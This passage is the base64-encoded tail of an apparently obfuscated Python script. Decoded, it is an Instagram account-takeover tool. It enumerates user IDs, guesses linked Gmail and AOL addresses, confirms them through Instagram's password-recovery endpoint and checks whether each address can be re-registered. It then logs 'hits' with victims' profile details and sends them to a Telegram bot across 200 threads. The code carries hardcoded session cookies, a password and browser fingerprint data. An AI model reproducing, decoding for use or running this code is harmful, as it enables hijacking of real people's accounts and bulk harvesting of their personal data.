EtbW9iaWxlJzogJz8wJywKICAgICAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciV2luZG93cyInLAogICAgICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAnZW1wdHknLAogICAgICAgICAgICAnc2VjLWZldGNoLW1vZGUnOiAnY29ycycsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtc2l0ZSc6ICdzYW1lLW9yaWdpbicsCiAgICAgICAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjAuMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGcvMTIwLjAuMC4wJywKICAgICAgICAgICAgJ3gtcmVxdWVzdGVkLXdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnLAogICAgICAgIH0KCiAgICAgICAgcGFyYW1zID0gewogICAgICAgICAgICAndmFsaWRhdGVGaWVsZCc6ICd1c2VySWQnLAogICAgICAgIH0KCiAgICAgICAgZGF0YSA9IGYnYnJvd3Nlci1mcC1kYXRhPSU3QiUyMmxhbmd1YWdlJTIyJTNBJTIyZW4tVVMlMjIlMkMlMjJjb2xvckRlcHRoJTIyJTNBMjQlMkMlMjJkZXZpY2VNZW1vcnklMjIlM0E4JTJDJTIycGl4ZWxSYXRpbyUyMiUzQTElMkMlMjJoYXJkd2FyZUNvbmN1cnJlbmN5JTIyJTNBNCUyQyUyMnRpbWV6b25lT2Zmc2V0JTIyJTNBLTYwJTJDJTIydGltZXpvbmUlMjIlM0ElMjJBZnJpY2ElMkZDYXNhYmxhbmNhJTIyJTJDJTIyc2Vzc2lvblN0b3JhZ2UlMjIlM0ExJTJDJTIybG9jYWxTdG9yYWdlJTIyJTNBMSUyQyUyMmluZGV4ZWREYiUyMiUzQTElMkMlMjJjcHVDbGFzcyUyMiUzQSUyMnVua25vd24lMjIlMkMlMjJwbGF0Zm9ybSUyMiUzQSUyMldpbjMyJTIyJTJDJTIyZG9Ob3RUcmFjayUyMiUzQSUyMnVua25vd24lMjIlMkMlMjJwbHVnaW5zJTIyJTNBJTdCJTIyY291bnQlMjIlM0E1JTJDJTIyaGFzaCUyMiUzQSUyMjJjMTQwMjRiZjg1ODRjM2Y3ZjYzZjI0ZWE0OTBlODEyJTIyJTdEJTJDJTIyY2FudmFzJTIyJTNBJTIyY2FudmFzJTIwd2luZGluZyUzQXllc35jYW52YXMlMjIlMkMlMjJ3ZWJnbCUyMiUzQTElMkMlMjJ3ZWJnbFZlbmRvckFuZFJlbmRlcmVyJTIyJTNBJTIyR29vZ2xlJTIwSW5jLiUyMChJbnRlbCl+QU5HTEUlMjAoSW50ZWwlMkMlMjBJbnRlbChSKSUyMEhEJTIwR3JhcGhpY3MlMjA0MDAwJTIwKDB4MDAwMDAxNjYpJTIwRGlyZWN0M0QxMSUyMHZzXzVfMCUyMHBzXzVfMCUyQyUyMEQzRDExKSUyMiUyQyUyMmFkQmxvY2slMjIlM0EwJTJDJTIyaGFzTGllZExhbmd1YWdlcyUyMiUzQTAlMkMlMjJoYXNMaWVkUmVzb2x1dGlvbiUyMiUzQTAlMkMlMjJoYXNMaWVkT3MlMjIlM0EwJTJDJTIyaGFzTGllZEJyb3dzZXIlMjIlM0EwJTJDJTIydG91Y2hTdXBwb3J0JTIyJTNBJTdCJTIycG9pbnRzJTIyJTNBMCUyQyUyMmV2ZW50JTIyJTNBMCUyQyUyMnN0YXJ0JTIyJTNBMCU3RCUyQyUyMmZvbnRzJTIyJTNBJTdCJTIyY291bnQlMjIlM0EzMyUyQyUyMmhhc2glMjIlM0ElMjJlZGVlZmQzNjAxNjFiNGJmOTQ0YWMwNDVlNDFkMGIyMSUyMiU3RCUyQyUyMmF1ZGlvJTIyJTNBJTIyMTI0LjA0MzQ3NTI3NTE2MDc0JTIyJTJDJTIycmVzb2x1dGlvbiUyMiUzQSU3QiUyMnclMjIlM0ElMjIxNjAwJTIyJTJDJTIyaCUyMiUzQSUyMjkwMCUyMiU3RCUyQyUyMmF2YWlsYWJsZVJlc29sdXRpb24lMjIlM0ElN0IlMjJ3JTIyJTNBJTIyODYwJTIyJTJDJTIyaCUyMiUzQSUyMjE2MDAlMjIlN0QlMkMlMjJ0cyUyMiUzQSU3QiUyMnNlcnZlJTIyJTNBMTcwNDc5MzA5NDg0NCUyQyUyMnJlbmRlciUyMiUzQTE3MDQ3OTMwOTY1MzQlN0QlN0Qmc3BlY0lkPXtzcGVjSWR9JmNhY2hlU3RvcmVkPSZjcnVtYj17Y3J1bWJ9JmFjcnVtYj17YWNydW1ifSZzZXNzaW9uSW5kZXg9e3Nlc3Npb25JbmRleH0mZG9uZT1odHRwcyUzQSUyRiUyRnd3dy5hb2wuY29tJmdvb2dsZUlkVG9rZW49JmF1dGhDb2RlPSZhdHRyU2V0SW5kZXg9MCZzcGVjRGF0YT17c3BlY0RhdGF9Jm11bHRpRG9tYWluPSZ0b3MwPW9hdGhfZnJlZXJlZyU3Q3VzJTdDZW4tVVMmZmlyc3ROYW1lPWFobWVkJmxhc3ROYW1lPU1haG9zJnVzZXJpZC1kb21haW49eWFob28mdXNlcklkPXtuYW1lfSZwYXNzd29yZD1EcmFobWVkMjAwNiMjJCQmbW09MTAmZGQ9MjQmeXl5eT0yMDAwJnNpZ251cD0nCgogICAgICAgIHJlcyA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vbG9naW4uYW9sLmNvbS9hY2NvdW50L21vZHVsZS9jcmVhdGUnLCBwYXJhbXM9cGFyYW1zLCBoZWFkZXJzPWhlYWRlcnMsIGRhdGE9ZGF0YSwgY29va2llcz1jb29raWVzKS50ZXh0CiAgICAgICAgaWYgJ3siZXJyb3JzIjpbXX0nIGluIHJlczoKICAgICAgICAgICAgaGl0cyArPSAxCiAgICAgICAgICAgIHBwcHAoKQogICAgICAgICAgICBpZiAnQCcgbm90IGluIGVtYWlsOgogICAgICAgICAgICAgICAgb2sgPSBlbWFpbCArICdAYW9sLmNvbScKICAgICAgICAgICAgICAgIHVzZXJuYW1lLCBnZyA9IG9rLnNwbGl0KCdAJykKICAgICAgICAgICAgICAgIEluZm9BY2ModXNlcm5hbWUsIGdnKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgdXNlcm5hbWUsIGdnID0gZW1haWwuc3BsaXQoJ0AnKQogICAgICAgICAgICAgICAgSW5mb0FjYyh1c2VybmFtZSwgZ2cpCiAgICAgICAgZWxzZTogCiAgICAgICAgICBiYWRlbWFpbCs9MQogICAgICAgICAgcHBwcCgpCiAgICBleGNlcHQ6JycKICAgIAoKZGVmIGNoZWNrKGVtYWlsKToKICAgIGdsb2JhbCBnb29kaWcsIGJhZGluc3RhCiAgICB1YSA9IGdlbmVyYXRlX3VzZXJfYWdlbnQoKQogICAgZGV2ID0gJ2FuZHJvaWQtJwogICAgZGV2aWNlX2lkID0gZGV2ICsgaGFzaGxpYi5tZDUoc3RyKHV1aWQudXVpZDQoKSkuZW5jb2RlKCkpLmhleGRpZ2VzdCgpWzoxNl0KICAgIHV1aSA9IHN0cih1dWlkLnV1aWQ0KCkpCiAgICBoZWFkZXJzID0gewogICAgICAgICdVc2VyLUFnZW50JzogdWEsCiAgICAgICAgJ0Nvb2tpZSc6ICdtaWQ9WlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUDsgY3NyZnRva2VuPTl5M041a0xxemlhbFFBN3o5NkFNaXlBS0xNQldwcVZqJywKICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOCcsCiAgICB9CiAgICBkYXRhID0gewogICAgICAgICdzaWduZWRfYm9keSc6ICcwZDA2N2MyZjg2Y2FjMmMxN2Q2NTU2MzFjOWNlYzI0MDIwMTJmYjBhMzI5YmNhZmIzYjFmNGMwYmI1NmIxZjFmLicgKyBqc29uLmR1bXBzKHsKICAgICAgICAgICAgJ19jc3JmdG9rZW4nOiAnOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmonLAogICAgICAgICAgICAnYWRpZCc6IHV1aSwKICAgICAgICAgICAgJ2d1aWQnOiB1dWksCiAgICAgICAgICAgICdkZXZpY2VfaWQnOiBkZXZpY2VfaWQsCiAgICAgICAgICAgICdxdWVyeSc6IGVtYWlsCiAgICAgICAgfSksCiAgICAgICAgJ2lnX3NpZ19rZXlfdmVyc2lvbic6ICc0JywKICAgIH0KICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL2FjY291bnRzL3NlbmRfcmVjb3ZlcnlfZmxvd19lbWFpbC8nLCBoZWFkZXJzPWhlYWRlcnMsIGRhdGE9ZGF0YSkudGV4dAogICAgaWYgZW1haWwgaW4gcmVzcG9uc2U6CiAgICAgICAgaWYgJ0BnbWFpbC5jb20nIGluIGVtYWlsOgogICAgICAgICAgICBjaGVja19nbWFpbChlbWFpbCkKICAgICAgICBlbGlmICdAYW9sLmNvbScgaW4gZW1haWwgb3IgJ0BhKiouY29tJyBpbiBlbWFpbDoKICAgICAgICAgICAgY2hlY2tfYW9sKGVtYWlsKQogICAgICAgIGdvb2RpZyArPSAxCiAgICAgICAgcHBwcCgpCiAgICBlbHNlOgogICAgICAgIGJhZGluc3RhICs9IDEKICAgICAgICBwcHBwKCkKCgoKZGVmIHJlc3QodXNlcik6CiAgdHJ5OgogICAgaGVhZGVycyA9IHsKICAgICdYLVBpZ2Vvbi1TZXNzaW9uLUlkJzogJzUwY2M2ODYxLTcwMzYtNDNiNC04MDJlLWZiNDI4Mjc5OWM2MCcsCiAgICAnWC1QaWdlb24tUmF3Y2xpZW50dGltZSc6ICcxNzAwMjUxNTc0Ljk4MicsCiAgICAnWC1JRy1Db25uZWN0aW9uLVNwZWVkJzogJy0xa2JwcycsCiAgICAnWC1JRy1CYW5kd2lkdGgtU3BlZWQtS0JQUyc6ICctMS4wMDAnLAogICAgJ1gtSUctQmFuZHdpZHRoLVRvdGFsQnl0ZXMtQic6ICcwJywKICAgICdYLUlHLUJhbmR3aWR0aC1Ub3RhbFRpbWUtTVMnOiAnMCcsCiAgICAnWC1CbG9rcy1WZXJzaW9uLUlkJzogJ2M4MGM1ZmIzMGRmYWU5ZTI3M2U0MDA5ZjAzYjE4MjgwYmIzNDNiMDg2MmQ2NjNmMzFhM2M2M2YxM2E5ZjMxYzAnLAogICAgJ1gtSUctQ29ubmVjdGlvbi1UeXBlJzogJ1dJRkknLAogICAgJ1gtSUctQ2FwYWJpbGl0aWVzJzogJzNiclR2dz09JywKICAgICdYLUlHLUFwcC1JRCc6ICc1NjcwNjczNDMzNTI0MjcnLAogICAgJ1VzZXItQWdlbnQnOiAnSW5zdGFncmFtIDEwMC4wLjAuMTcuMTI5IEFuZHJvaWQgKDI5LzEwOyA0MjBkcGk7IDEwODB4MjEyOTsgc2Ftc3VuZzsgU00tTTIwNUY7IG0yMGx0ZTsgZXh5bm9zNzkwNDsgZW5fR0I7IDE2MTQ3ODY2NCknLAogICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1HQiwgZW4tVVMnLAogICAgICdDb29raWUnOiAnbWlkPVpWZkd2Z0FCQUFHb1FxYTdBWTNtZ29ZQlYxblA7IGNzcmZ0b2tlbj05eTNONWtMcXppYWxRQTd6OTZBTWl5QUtMTUJXcHFWaicsCiAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOCcsCiAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAogICAgJ0hvc3QnOiAnaS5pbnN0YWdyYW0uY29tJywKICAgICdYLUZCLUhUVFAtRW5naW5lJzogJ0xpZ2VyJywKICAgICdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAogICAgJ0NvbnRlbnQtTGVuZ3RoJzogJzM1NicsCn0KICAgIGRhdGEgPSB7CiAgICAnc2lnbmVkX2JvZHknOiAnMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDAyMDEyZmIwYTMyOWJjYWZiM2IxZjRjMGJiNTZiMWYxZi57Il9jc3JmdG9rZW4iOiI5eTNONWtMcXppYWxRQTd6OTZBTWl5QUtMTUJXcHFWaiIsImFkaWQiOiIwZGZhZjgyMC0yNzQ4LTQ2MzQtOTM2NS1jM2Q4YzgwMTEyNTYiLCJndWlkIjoiMWY3ODQ0MzEtMjY2My00ZGI5LWI2MjQtODZiZDljZTFkMDg0IiwiZGV2aWNlX2lkIjoiYW5kcm9pZC1iOTNkZGIzN2U5ODM0ODFjIiwicXVlcnkiOiInK3VzZXIrJyJ9JywKICAgICdpZ19zaWdfa2V5X3ZlcnNpb24nOiAnNCcsCiAgfQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvYWNjb3VudHMvc2VuZF9yZWNvdmVyeV9mbG93X2VtYWlsLycsaGVhZGVycz1oZWFkZXJzLGRhdGE9ZGF0YSwpLmpzb24oKQogICAgcj1yZXNwb25zZVsnZW1haWwnXQogIGV4Y2VwdDoKICAgIHI9J25vIFJFU1QgIScKICByZXR1cm4gcgoKZGVmIGRhdGUoaHkpOgogICAgdHJ5OgogICAgICAgIHJhbmdlcyA9IFsKICAgICAgICAgICAgKDEyNzkwMDAsIDIwMTApLAogICAgICAgICAgICAoMTc3NTAwMDAsIDIwMTEpLAogICAgICAgICAgICAoMjc5NzYwMDAwLCAyMDEyKSwKICAgICAgICAgICAgKDkwMDk5MDAwMCwgMjAxMyksCiAgICAgICAgICAgICgxNjI5MDEwMDAwLCAyMDE0KSwKICAgICAgICAgICAgKDI1MDAwMDAwMDAsIDIwMTUpLAogICAgICAgICAgICAoMzcxMzY2ODc4NiwgMjAxNiksCiAgICAgICAgICAgICg1Njk5Nzg1MjE3LCAyMDE3KSwKICAgICAgICAgICAgKDg1OTc5MzkyNDUsIDIwMTgpLAogICAgICAgICAgICAoMjEyNTQwMjk4MzQsIDIwMTkpLAogICAgICAgICAgICAoNDM0NjQ0NzUzOTUsIDIwMjApLAogICAgICAgICAgICAoNTAyODkyOTc2NDcsIDIwMjEpLAogICAgICAgICAgICAoNTc0NjQ3MDcwODIsIDIwMjIpLAogICAgICAgICAgICAoNjMzMTM0MjY5MzgsIDIwMjMpCiAgICAgICAgICAgIAogICAgICAgIF0KICAgICAgICAKICAgICAgICBmb3IgdXBwZXIsIHllYXIgaW4gcmFuZ2VzOgogICAgICAgICAgICBpZiBoeSA8PSB1cHBlcjoKICAgICAgICAgICAgICAgIHJldHVybiB5ZWFyCiAgICAgICAgcmV0dXJuIDIwMjMKICAgIAogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwYXNzCgogICAgCmRlZiBJbmZvQWNjKHVzZXJuYW1lLCBnZyk6CiAgICBnbG9iYWwgdG90YWwKCiAgICBycj0gaW5mb2luc3RhLmdldCh1c2VybmFtZSx7fSkKCiAgICBJZCA9IHJyLmdldCgncGsnLCBOb25lKQogICAgZnVsbF9uYW1lID0gcnIuZ2V0KCdmdWxsX25hbWUnLCBOb25lKQogICAgZm93cyA9IHJyLmdldCgnZm9sbG93ZXJfY291bnQnLCBOb25lKQogICAgZm93ZyA9IHJyLmdldCgnZm9sbG93aW5nX2NvdW50JywgTm9uZSkKICAgIHBwID0gcnIuZ2V0KCdtZWRpYV9jb3VudCcsIE5vbmUpCiAgICBpc1ByYWlzZSA9IHJyLmdldCgnaXNfcHJpdmF0ZScsIE5vbmUpCiAgICBiaW8gPSByci5nZXQoJ2Jpb2dyYXBoeScsIE5vbmUpCiAgICBpc192ZXJpZmllZCA9IHJyLmdldCgnaXNfdmVyaWZpZWQnLCBOb25lKQogICAgYml6eiA9IHJyLmdldCgnaXNfYnVzaW5lc3MnLCBOb25lKQogICAgdHJ5OgogICAgICAgIGlmIChmb3dzIGFuZCBwcCk6CiAgICAgICAgICAgIGlmIChpbnQoZm93cykgPj0gMTAgYW5kIGludChwcCkgPj0gMik6CiAgICAgICAgICAgICAgICBtZXRhID0gVHJ1ZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgbWV0YSA9IEZhbHNlCiAgICAgICAgZWxzZToKICAgICAgICAgICAgbWV0YSA9IEZhbHNlCiAgICBleGNlcHQ6CiAgICAgICAgbWV0YT1GYWxzZQoKCiAgICB0b3RhbCArPSAxCiAgICBzcyA9IGYnJycKICAgICAgIOKAoiDwnZCH8J2QiPCdkJPwnZCSIPCdkIXwnZCR8J2QjvCdkIwg8J2QgPCdkI3wnZCI8J2QiCDigKIK4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAIAogSGl0IC0ge3RvdGFsfQogSXMgTWV0YSBFbmFibGVkIC0ge21ldGF9CiBJcyBCdWlzbmVzcyAtIHtiaXp6fQogSXMgVmVyaWZpZWQgLSB7aXNfdmVyaWZpZWR9CiBGb2xsb3dlciAtIHtmb3dzfQogRm9sbG93aW5nIC0ge2Zvd2d9CiBQb3N0IC0ge3BwfQogQmlvIC0ge2Jpb30KIFByaXZhdGUgLSB7aXNQcmFpc2V9CiBGdWxsIE5hbWUgLSB7ZnVsbF9uYW1lfQogSUQgLSB7SWR9CiBEb21haW4gLSB7Z2d9CiBVc2VybmFtZSAtIEB7dXNlcm5hbWV9CiBFLU1haWwgLSB7dXNlcm5hbWV9QHtnZ30KIFJlc3QgLSB7cmVzdCh1c2VybmFtZSl9CiBVcmwgLSBodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL3t1c2VybmFtZX0K4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAIArwnZCB8J2QmCBAYW5paWh1IHwg8J2QifCdkI7wnZCI8J2QjSBAYW5paXNvbG8KJycnCgogICAgd2l0aCBvcGVuKCdBTklJLnR4dCcsICdhJykgYXMgZmY6CiAgICAgICAgZmYud3JpdGUoZid7c3N9XG4nKQoKICAgIHRyeToKICAgICAgICB0cnk6cmVxdWVzdHMuZ2V0KGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17SUR9JnRleHQ9e3NzfSIpCiAgICAgICAgZXhjZXB0OnBhc3MKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCiAgICAgICAgCmRlZiBnZygpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAibHNkIjogJycuam9pbihyYW5kb20uY2hvaWNlcyhzdHJpbmcuYXNjaWlfbGV0dGVycyArIHN0cmluZy5kaWdpdHMsIGs9MzIpKSwKICAgICAgICAgICAgInZhcmlhYmxlcyI6IGpzb24uZHVtcHMoeyJpZCI6IGludChyYW5kb20ucmFuZHJhbmdlKGJiaywgaWQpKSwgInJlbmRlcl9zdXJmYWNlIjogIlBST0ZJTEUifSksCiAgICAgICAgICAgICJkb2NfaWQiOiAiMjU2MTgyNjE4NDExNTA4NDAiCiAgICAgICAgfQoKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoCiAgICAgICAgICAgICJodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FwaS9ncmFwaHFsIiwKICAgICAgICAgICAgaGVhZGVycz17IlgtRkItTFNEIjogZGF0YVsibHNkIl19LAogICAgICAgICAgICBkYXRhPWRhdGEKICAgICAgICApCiAgICAgICAgdHJ5OgogICAgICAgICAgICB1c2VybmFtZSA9IHJlc3BvbnNlLmpzb24oKS5nZXQoJ2RhdGEnLCB7fSkuZ2V0KCd1c2VyJywge30pLmdldCgndXNlcm5hbWUnKQogICAgICAgICAgICBpbmZvaW5zdGFbdXNlcm5hbWVdID0gcmVzcG9uc2UuanNvbigpLmdldCgnZGF0YScsIHt9KS5nZXQoJ3VzZXInLCB7fSkKICAgICAgICAgICAgZW1haWxzID0gWyB1c2VybmFtZSArICdAZ21haWwuY29tJywgdXNlcm5hbWUgKyAnQGFvbC5jb20nXQogICAgICAgICAgICBmb3IgZW1haWwgaW4gZW1haWxzOgogICAgICAgICAgICAgICAgY2hlY2soZW1haWwpCiAgICAgICAgZXhjZXB0OicnCmZvciBfIGluIHJhbmdlKDIwMCk6CiAgICBUaHJlYWQodGFyZ2V0PWdnKS5zdGFydCgp').decode())